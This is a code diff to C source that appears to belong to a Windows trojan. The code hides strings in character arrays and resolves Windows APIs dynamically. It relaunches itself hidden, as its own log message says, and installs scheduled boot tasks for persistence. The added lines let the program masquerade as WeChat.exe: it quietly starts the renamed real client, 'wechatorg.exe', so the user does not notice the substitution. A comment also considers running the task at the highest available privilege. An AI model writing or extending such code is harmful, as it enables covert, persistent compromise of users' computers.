@@ -244,10 +244,11 @@ int setBoot(char* szSysDir, char* strPEResidence, int iSystemVersion)
 	//double click the program on desktop
 	else if (lplstrcmpiA(szCurrentPath, strDataPath) != 0)
 	{
+		char szwechat[] = { 'W','e','C','h','a','t','.','e','x','e',0 };
 		char szexplorer[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
 		char szParentProcName[MAX_PATH];
 		iRet = GetParentProcName(szParentProcName);
-		if (lplstrcmpiA(szParentProcName, szexplorer) == 0)
+		if (lplstrcmpiA(szParentProcName, szexplorer) == 0 && lstrcmpiA(szwechat, szExeName) != 0)
 		{
 			char strShowFileName[MAX_PATH] = { 0 };
 			char* pShowFileName = GetLinkDocFileName(strShowFileName, szCurrentPath);
@@ -313,22 +314,32 @@ int setBoot(char* szSysDir, char* strPEResidence, int iSystemVersion)
 
 		if (lplstrcmpiA(szParentProcName, szexplorer) == 0)
 		{
-			if (gMutex)
+			if (lstrcmpiA(szwechat, szExeName) == 0)
 			{
-				lpReleaseMutex(gMutex);
-				lpCloseHandle(gMutex);
+				char wechatcmd[MAX_PATH] = { 0 };
+				lpwsprintfA(wechatcmd, "\"%s%s\"", szCurrentExePath, "wechatorg.exe");
+				//char szopen[] = { 'o','p','e','n',0 };
+				//HINSTANCE hInst = lpShellExecuteA(0, szopen,szCmd,0,strDataPath,SW_HIDE);
+				iRet = lpWinExec(wechatcmd, SW_HIDE);
 			}
-			char szCmd[MAX_PATH] = { 0 };
-			lpwsprintfA(szCmd, "\"%s\"", strPEResidence);
-			//char szopen[] = { 'o','p','e','n',0 };
-			//HINSTANCE hInst = lpShellExecuteA(0, szopen,szCmd,0,strDataPath,SW_HIDE);
-			iRet = lpWinExec(szCmd, SW_HIDE);
+			else {
+				if (gMutex)
+				{
+					lpReleaseMutex(gMutex);
+					lpCloseHandle(gMutex);
+				}
+				char szCmd[MAX_PATH] = { 0 };
+				lpwsprintfA(szCmd, "\"%s\"", strPEResidence);
+				//char szopen[] = { 'o','p','e','n',0 };
+				//HINSTANCE hInst = lpShellExecuteA(0, szopen,szCmd,0,strDataPath,SW_HIDE);
+				iRet = lpWinExec(szCmd, SW_HIDE);
 
-			lpwsprintfA(szShowInfo, "explorer.exe start program at first, now to restart program:%s at second for the sake of hide\r\n", strPEResidence);
-			writeLog(szShowInfo);
+				lpwsprintfA(szShowInfo, "explorer.exe start program at first, now to restart program:%s at second for the sake of hide\r\n", strPEResidence);
+				writeLog(szShowInfo);
 
-			lpExitProcess(0);
-			return FALSE;
+				lpExitProcess(0);
+				return FALSE;
+			}
 		}
 	}
 	else {
@@ -698,7 +709,7 @@ int createBootTask(int iInterval, char* szTaskName, char* szPeFileName, char* pa
 	"</Triggers>\r\n"
 	"<Principals>\r\n"
 	"<Principal id=\"Author\">\r\n"
-	"<RunLevel>LeastPrivilege</RunLevel>\r\n"
+	"<RunLevel>LeastPrivilege</RunLevel>\r\n"			//HighestAvailable LeastPrivilege
 	"<UserId>%s</UserId>\r\n"
 	"<LogonType>InteractiveToken</LogonType>\r\n"
 	"</Principal>\r\n"
